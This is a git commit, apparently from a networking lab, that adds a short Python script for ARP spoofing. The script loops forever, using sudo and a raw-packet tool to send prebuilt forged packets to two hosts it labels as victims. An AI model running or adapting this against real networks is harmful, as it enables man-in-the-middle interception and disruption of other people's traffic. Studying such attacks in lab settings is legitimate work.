3251e0b4ffd61f1f24efc52a09e8b5e1561d4e17
Mohammad Hasib <33131068+Hasib9876@users.noreply.github.com>
2025-12-02 17:40:41 +0100

    Add ARP spoofing script in attack.py
    Implement ARP spoofing functionality to send packets between two devices.

---
+++ attack.py
@@ -0,0 +1,26 @@
+import subprocess
+import time
+from datetime import datetime
+
+# Network settings
+alice_mac = "02:42:0a:0a:0a:02"
+bob_mac = "02:42:0a:0a:0a:03"
+network_interface = "eth1"
+protocol = "0x0806"
+wait_time = 7
+
+def send_packet(mac_addr, packet_file, msg):
+    """Send ARP packet"""
+    now = datetime.now().strftime("%H:%M:%S")
+    print(f"[{now}] {msg} (MAC: {mac_addr})")
+    subprocess.run(["sudo", "raw_packet", network_interface, mac_addr, protocol, packet_file], check=True)
+
+# Start
+print("--- ARP Spoofing Started ---")
+
+while True:
+    # Send to alice
+    send_packet(alice_mac, "bobtoalice.bin", "Sending to victim 1")
+    # Send to bob
+    send_packet(bob_mac, "alicetobob.bin", "Sending to victim 2")
+    time.sleep(wait_time)
